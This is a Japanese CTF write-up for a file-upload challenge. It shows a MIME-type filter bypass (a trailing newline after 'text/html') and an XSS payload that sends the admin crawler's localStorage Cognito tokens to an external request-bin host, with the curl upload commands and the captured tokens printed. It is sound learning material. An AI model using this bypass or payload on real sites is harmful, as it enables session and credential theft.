# GEToken:Advanced:150pts

- [Target](https://d2vdz584uham25.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1IkL28aMRz2gmT9p4xaq-ki91A3RkhQ2y/view?usp=drive_link)  
- [Crawler](https://drive.google.com/file/d/1gPb9Opy6svFiYYj53zoAfopeabSnYLBa/view?usp=drive_link)  

[https://d2vdz584uham25.cloudfront.net/](https://d2vdz584uham25.cloudfront.net/)  

# Solution
URLとアプリケーション、クローラのソースが渡される。  
アクセスするとファイルアップロードサイトだ。  
![site.png](site/site.png)  
クローラのソースを見ると主要箇所は以下の通りであった。  
```ts
~~~
export const crawler = async (url: string) => {
  const browser = await launch({
    headless: true,
    args: puppeteerArgs,
  });
  /**
   * Dummy Cognito User Pool Login
   */
  const client = new CognitoIdentityProviderClient({ region: process.env.REGION, credentials: undefined });
  const command = new InitiateAuthCommand({
    AuthFlow: 'USER_PASSWORD_AUTH',
    ClientId: process.env.COGNITO_USER_POOL_CLIENT_ID || '',
    AuthParameters: {
      USERNAME: process.env.ADMIN_USERNAME || '',
      PASSWORD: process.env.ADMIN_PASSWORD || '',
    },
  });
  console.log(`command: ${JSON.stringify(command)}`);
  const response = await client.send(command);
  console.log(`response: ${JSON.stringify(response)}`);

  const IdToken = response.AuthenticationResult?.IdToken || '';
  const AccessToken = response.AuthenticationResult?.AccessToken || '';
  const RefreshToken = response.AuthenticationResult?.RefreshToken || '';
  const page = await browser.newPage();
  await page.goto(`${process.env.ALLOWED_URL || 'example.com'}`);
  await page.evaluate(
    (IdToken: string, AccessToken: string, RefreshToken: string) => {
      const randomNumber = Math.floor(Math.random() * 1000000);
      localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.idToken`, IdToken);
      localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.accessToken`, AccessToken);
      localStorage.setItem(`CognitoIdentityServiceProvider.${randomNumber}.refreshToken`, RefreshToken);
    },
    IdToken,
    AccessToken,
    RefreshToken,
  );

  await page.goto(url);
  await new Promise((resolve) => setTimeout(resolve, 500));
  const bodyHandle = await page.$('body');
  const html = await page.evaluate((body) => {
    if (!body) {
      return 'HTML is empty';
    }
    return body.innerHTML;
  }, bodyHandle);
  const path = new URL(url).pathname;
  await uploadToS3(`delivery/${path.split('/').pop()}`, Buffer.from(html));
  await browser.close();
};
```
`localStorage`に各種Tokenが入っているのでこれを盗み出せばよいようだ。  
JavaScriptが実行できればCookieを読み取るのとあまり変わりはない。  
次にアプリケーションのソースの主要箇所は以下の通りであった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const [contentType, ...params] = request.body.contentType.split(';');
  const type = contentType.split('/')[0].toLowerCase();
  const subtype = contentType.split('/')[1].toLowerCase();

  const denyMimeSubTypes = ['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl'];
  if (denyMimeSubTypes.includes(subtype)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }
  const denyStrings = new RegExp('[;,="\'()]');
  if (denyStrings.test(type) || denyStrings.test(subtype)) {
    return reply.code(400).send({ error: 'Invalid Type or SubType' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: `${type}/${subtype}`,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
まず初めに`contentType`を`split(';')`で分割し、さらにその先頭を`split('/')`で分割して小文字化している。  
変数名の通り、charsetを排除して`type`と`subtype`に分けているようだ。  
さらに`['html', 'javascript', 'xml', 'json', 'svg', 'xhtml', 'xsl']`に含まれる`subtype`は拒否し、正規表現`'[;,="\'()]'`で`type`と`subtype`ともに禁止文字をチェックしている。  
`,`のテクニックは使えず、`text/html`も`subtype`の検査に引っかかる。  
ここで、`text/html\u000a`のように末尾に特殊文字を付加するアイデアを思いつく。  
これで`subtype`は`html\u000a`となるので拒否されない。  
以下のすべての`localStorage`を外部へ送信するXSSを用いる。  
```html
<!DOCTYPE html>
<html>
<head>
    <title>XSSS (localStorage)</title>
</head>
<body>
    <h1>XSSS (localStorage)</h1>
    <script>
        let dataToSend = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            dataToSend[key] = localStorage.getItem(key);
        }
        fetch("https://enmz6ozs7du1q.x.pipedream.net/?satoki", {
            method: "POST",
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(dataToSend),
        })
    </script>
</body>
</html>
```
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":"text/html\u000a","length":618}' --upload-file xs3_localstorage.html 'https://d2vdz584uham25.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5250c0a74f-adv-3-upload.s3.ap-northeast-1.amazonaws.com/upload/6b6a72f7-7bc8-466b-a8f5-e02f0641ebcc?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAU6GDZQDOFXAXDSYZ%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T065710Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIhAKbIn4sJPR45rVY5NLmolFHdGocarksbUxtwM37R2RxFAiB54nMZ%2Bd2MxKYeWq2lPKRZfu5WwFZ3%2BI6vBwEV4bU8AyqtAwjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDMzOTcxMzAzMjQxMiIM3Tijc%2FmVT2OMOoAAKoEDLR2G%2BeYlAJJCIqbzUzj56rg4iBRzBx3qO5F4MMlcnIop8XXO13aGJFCxs6tLPySzZ5g1sjbSDIivjCyfwK1EN9YCbWkEpxwrBubASvvesZqIENAqRAExcYWaFccYKInwMv2X3MVulPH%2BcG3OumkMVXdvVDBnVG2GnaC3cCKBrhL89Jk3YBWznWfV40HPYkxGFwEiHBcncbP9noyvouifsmEC1EJkImV7Yws0ei5JyhMetXehJO9LR2PZFd0yi4GEJznPnGAqCPXVEf7TqXaUdTaAcewRSG9rM8OxP64ES%2BGV0Hfmo%2Ff2wQfaitwdqksxt05y7gOE0bLQy3IWdOnbZpHPjTgSdoCrApKOaRStJkdSkqBvmofiCq%2B1wK44Zf%2FT9C6K2ic0li54ujPuUtA3%2BuoUjrdhA2h8SIWMjU%2FExZhZSdb39KqlIywvLsBZtXvsM9%2FuI4ctFh2HCbt0I%2Fu55Q9y47NApSkAbF7SqKb%2F9H7lh%2FALNSw4rjzQz%2B20pY6TKjCLy5mwBjqdAYf9d2namdZH1UoJTxzPK5qMMvyGKCeMN3pQP5jXnPmpbAmA3MR4HiktFn1V8Q1A43Gow%2BKuaMmYuYJi6Q9QUer0gh38hHEt6CQ3ymG1O%2BwVNF6RVzdWSeuK95j7CzWCVJW%2FO0PnXMpUgp3LLkLMOQYgLY4jozEIaRqxIlzq3abrVTa6SKrfXioiRacYHoIuUbw9Y%2Fpvpr5B7elfYrQ%3D&X-Amz-Signature=d8d8eef89f37e358bc8b3433d365bf933a301d5b4877cd7737ba2e614dc2ed5e&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject","filename":"6b6a72f7-7bc8-466b-a8f5-e02f0641ebcc"}
$ curl -X PUT -H 'Content-Type: text/html' --upload-file xs3_localstorage.html 'https://uploadbucket-5250c0a74f-adv-3-upload.s3.ap-northeast-1.amazonaws.com/upload/6b6a72f7-7bc8-466b-a8f5-e02f0641ebcc?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAU6GDZQDOFXAXDSYZ%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T065710Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEM%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkcwRQIhAKbIn4sJPR45rVY5NLmolFHdGocarksbUxtwM37R2RxFAiB54nMZ%2Bd2MxKYeWq2lPKRZfu5WwFZ3%2BI6vBwEV4bU8AyqtAwjo%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDMzOTcxMzAzMjQxMiIM3Tijc%2FmVT2OMOoAAKoEDLR2G%2BeYlAJJCIqbzUzj56rg4iBRzBx3qO5F4MMlcnIop8XXO13aGJFCxs6tLPySzZ5g1sjbSDIivjCyfwK1EN9YCbWkEpxwrBubASvvesZqIENAqRAExcYWaFccYKInwMv2X3MVulPH%2BcG3OumkMVXdvVDBnVG2GnaC3cCKBrhL89Jk3YBWznWfV40HPYkxGFwEiHBcncbP9noyvouifsmEC1EJkImV7Yws0ei5JyhMetXehJO9LR2PZFd0yi4GEJznPnGAqCPXVEf7TqXaUdTaAcewRSG9rM8OxP64ES%2BGV0Hfmo%2Ff2wQfaitwdqksxt05y7gOE0bLQy3IWdOnbZpHPjTgSdoCrApKOaRStJkdSkqBvmofiCq%2B1wK44Zf%2FT9C6K2ic0li54ujPuUtA3%2BuoUjrdhA2h8SIWMjU%2FExZhZSdb39KqlIywvLsBZtXvsM9%2FuI4ctFh2HCbt0I%2Fu55Q9y47NApSkAbF7SqKb%2F9H7lh%2FALNSw4rjzQz%2B20pY6TKjCLy5mwBjqdAYf9d2namdZH1UoJTxzPK5qMMvyGKCeMN3pQP5jXnPmpbAmA3MR4HiktFn1V8Q1A43Gow%2BKuaMmYuYJi6Q9QUer0gh38hHEt6CQ3ymG1O%2BwVNF6RVzdWSeuK95j7CzWCVJW%2FO0PnXMpUgp3LLkLMOQYgLY4jozEIaRqxIlzq3abrVTa6SKrfXioiRacYHoIuUbw9Y%2Fpvpr5B7elfYrQ%3D&X-Amz-Signature=d8d8eef89f37e358bc8b3433d365bf933a301d5b4877cd7737ba2e614dc2ed5e&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject'
```
`https://d2vdz584uham25.cloudfront.net/upload/6b6a72f7-7bc8-466b-a8f5-e02f0641ebcc`にアクセスするとXSSが実行可能であった。  
注意点だがBurp Suiteなどを用いている場合、フロントでPUT時に`'Content-Disposition': 'attachment'`が設定されている。  
これがあるとアップロードしたHTMLファイルがDLされてしまうので削除する必要がある。  
URLをクローラへ投げると以下のリクエストが届く。  
```
POST
/?satoki
{"CognitoIdentityServiceProvider.919149.refreshToken":"eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAifQ.SYKf_HIJSgHwTG-wFI8jPrzej5J7LpA-j0qp_yBYhnxfPwxZ1uJIThUtpszOyNy3DG9O7NfLl0wL7FxsqfWtz2YE1VcaucvBqT04B5S9OhospiMnP7WnOZhurhxnBJBElAdPioh6DxCUEyC6ZHCAN-AOzTa-l_fqQ1Eaa7WvrmebPpCZAe_YsWIcMGLK4oqGSjiJC41BV4ogb-dOAn7M2VfOILGDJ75SZH4tkA6HRPHnqDertvM3E7Ceua2BlQHX30D2VuwDUft4Qm8czgTAGZnzPjcgyEYwBnAJR9nB47n24Ehqdg-LmduzGg6gy__N6S2qY2VqHUOgexDhpVedKg.hUetLDqLPsVjyfKU.LiBC_Fs_eDkDVg7sUMfOGNUsVHa3yu96sG-3SUnmgR8U5FeeKoXik2X3NLCzOJ6VWL1CkcNDR8JbAzsYadzv9mVBNkr4o4c23NKfj2EFk5aOnDBbJli7bKHAqHbWMycCC8hqP8afT12swAjcjD4UasBan04D1x0TVirhk1giU-kgitI79UBhPhFbEfezXZSJqkyDXen3Jp6L3yKF1zCahfKd3rKHumB7mtiqOtEDpH2QcD7ypo9mdniEICX4h52Al2GLjyXdVKID-9lD3OHkQUs8-8qgF11WFCUmMtmlQJ62-2GK9TE6MLAJzLVRZ_iQSpd4VqMPsIuksTJQaDb4CpWORhbqF1Y0YaiwH0i1UBNfobNqCYacnB_vwLA5j16H4Ucp2l_85rLmxU_z87_Yr_V3t_KDcInIGtNxxpitb1HXiq5t2xtsNFUQzOZRWngfm5jWHgaf1tKvUATuOaUUod5VUTFSNThHU1gjC5cOmOe0JM15CfWNFtCR0IsuYqo7NcQ7E0VDjKvwMoFGDU_6bfFK6X6yTYrZJCLfbNlxm_9o8VNYAX0y6eYUbDaiDtvjYVpcP06Vz7froJs1Hpv-ilvsmrWqJt-NaZyHtpfPO6AW36ORSBpwmbju14NCuNZVlEJ_xBorD8CnIqhp1Gta4g5u8wskIImLYpn6hH7rf-3r99bMHeixzuJW-EIpZi-JosH5IpH6ViuTJdPtFET7vfiGqaCZiObKDudPQOF35TUAi2NZRcqdza2G_CxTLMxf4o8ALCgWndbx0Ya4eUZj4sBdGgp2QpPJ_4GhWEI30Yz5jkrB890z5RWU0Pznxpa6eoHa9u-_Q0SITRYSutub-nQI4zjbcZSOmSBJCt7KMouwAfuLgXGHrrPvn3okuYq9epxP8NG2nAadbxw_H98NNdhkriJG4diMz1Ow1MiKgjkDkqnwy8CieFBhGPKdnSJrO7BFmvzWqmVV7yHYTX37OoetKTnhDn82iYyUhs5u2DbhLPG-nFGakIJqMMT-_xZdc73l8AWKQ_SVATvqnaUPkNwyQY90l8RRtpfVu0GeX7JFVSn0RtEadS1PRmdtxLTOioDs45hszW5TnO59nBWvmYtUpbJJGppZ3NVf9O_FA8Ncp8Dm_6qf-XjegKOfPpbzKO9WrcpXJBjTsr7s4XWxwepgsLvKa7W_pVkISaY8L8GCHyAguQZ1aOQOxVUt4m9pjonLPGZ28jU_LN3WQcK_wwNmVGk1Qjq7t7OfAl5vqV3yQb6HT2_tidzQqEV8V3fRuF5V8QhKOOpEwNK79Lg3.ZnSmJ61LICnAUb7Tv0L0cg","CognitoIdentityServiceProvider.919149.idToken":"eyJraWQiOiJYU0pnQnFGVTlDQmJQRTdmMGtPVHI3V3NSaGlMZHoySGw0YnliVXZlYWtRPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI0OGNiYzk4OS04OGQzLTQzNTUtYmYwOC00YjEyZjIyZWQ5NjMiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiY3VzdG9tOmZsYWciOiJmbGFne2M4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjfSIsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC5hcC1ub3J0aGVhc3QtMS5hbWF6b25hd3MuY29tXC9hcC1ub3J0aGVhc3QtMV83UkN3NGlzTTkiLCJjb2duaXRvOnVzZXJuYW1lIjoiYWRtaW4iLCJvcmlnaW5fanRpIjoiM2ZhOGY0Y2ItM2JlMi00NDYzLTkzYTQtYTg5Y2JkOGQ1Mzk4IiwiYXVkIjoiNnA1YTVjZnU2NDd2bGgwdmEwcWVoaHZ2bHEiLCJldmVudF9pZCI6ImRiYzQ3MmVjLTdkMTctNDU1NC1iNjk1LTBmMzI4MTZhZWI1YyIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzExNjk1NTQ4LCJleHAiOjE3MTE2OTkxNDgsImlhdCI6MTcxMTY5NTU0OCwianRpIjoiNTcyM2YwMDQtZmQ4NS00YjYzLWIxY2YtNjEyZGYxYmY0N2Y4IiwiZW1haWwiOiJuLnNhaXRvQGF6YXJhLmpwIn0.KtD9NKljSBpqtCbS8uif-IRGqo0Eefl6ovQZ05ZxJ9wmU8S3-Qy7S_DPV8orheGyZZ-vhIw1nrdKmZZCZnWl8rN8-j6AksqsQZol-qILzkDefaRE7T2ZDphFvQXXVcMXNsRVphKWKleze9ERLj33JgxI2gIsTs1N5o9sxpmGaDgewthKmzM1EYYAn9w4PQh-FmG8x_hrgvFhyoavfKo3lirVAwXMpBvhCzjMo50wQ2S9P4VA-6hGnE68o3o4FiGVAvEGY_5KD4uB4244njFNpgy0TTUOVYpAtybNjupmOzCeEX57kP743oUxpKypuTDpevidWJaHoFyP2A9imGxLUQ","CognitoIdentityServiceProvider.919149.accessToken":"eyJraWQiOiJLMUJNdE92S0tjT0hpNFNxdlI4bHE1NDl4VUlWZTM2N25VZnlqUVRodHlzPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI0OGNiYzk4OS04OGQzLTQzNTUtYmYwOC00YjEyZjIyZWQ5NjMiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAuYXAtbm9ydGhlYXN0LTEuYW1hem9uYXdzLmNvbVwvYXAtbm9ydGhlYXN0LTFfN1JDdzRpc005IiwiY2xpZW50X2lkIjoiNnA1YTVjZnU2NDd2bGgwdmEwcWVoaHZ2bHEiLCJvcmlnaW5fanRpIjoiM2ZhOGY0Y2ItM2JlMi00NDYzLTkzYTQtYTg5Y2JkOGQ1Mzk4IiwiZXZlbnRfaWQiOiJkYmM0NzJlYy03ZDE3LTQ1NTQtYjY5NS0wZjMyODE2YWViNWMiLCJ0b2tlbl91c2UiOiJhY2Nlc3MiLCJzY29wZSI6ImF3cy5jb2duaXRvLnNpZ25pbi51c2VyLmFkbWluIiwiYXV0aF90aW1lIjoxNzExNjk1NTQ4LCJleHAiOjE3MTE2OTkxNDgsImlhdCI6MTcxMTY5NTU0OCwianRpIjoiOTU4NmU0ZjgtZTljYy00YmJhLTk0NmYtNDMyOWE5ZTlmMGU0IiwidXNlcm5hbWUiOiJhZG1pbiJ9.1YxKXKO3Oew6WdBP-lOeWvIabnb1kNRznOq5d_28RuvgUS-Kn02XzOm8AEEtn76FeSmdsAR58OKoUgyt_bb8rlwDt69xYxdFrSixh15FVsVqZHPwCXYcrUADKAF3XuoooceZfXL9At6TV2r7Qmw3kuOsGnz07bI3T22OILO9p9rOMotih1lf3_xOT00y-2lrENhPNk8WNp2aHSItxJ9lUgB0NrSTWS_554V9p4SAun9U2nh4CVnfCo1rKR9eb_MSGdmbFVFmjCL_wSieCI0ZeMHCtz01G7xCkygaNrBLZLf7ZFyS4xKbMlDCPPQjNatUiUYgbQGt7FliEyVpBp4R6Q"}
```
`CognitoIdentityServiceProvider.919149.idToken`をJWTデコードすると以下となった。  
```json
{
    "sub": "48cbc989-88d3-4355-bf08-4b12f22ed963",
    "email_verified": true,
    "custom:flag": "flag{c81e728d9d4c2f636f067f89cc14862c}",
    "iss": "https://cognito-idp.ap-northeast-1.amazonaws.com/ap-northeast-1_7RCw4isM9",
    "cognito:username": "admin",
    "origin_jti": "3fa8f4cb-3be2-4463-93a4-a89cbd8d5398",
    "aud": "6p5a5cfu647vlh0va0qehhvvlq",
    "event_id": "dbc472ec-7d17-4554-b695-0f32816aeb5c",
    "token_use": "id",
    "auth_time": 1711695548,
    "exp": 1711699148,
    "iat": 1711695548,
    "jti": "5723f004-fd85-4b63-b1cf-612df1bf47f8",
    "email": "n.saito@azara.jp"
}
```
`custom:flag`にflagが設定されていた。  

## flag{c81e728d9d4c2f636f067f89cc14862c}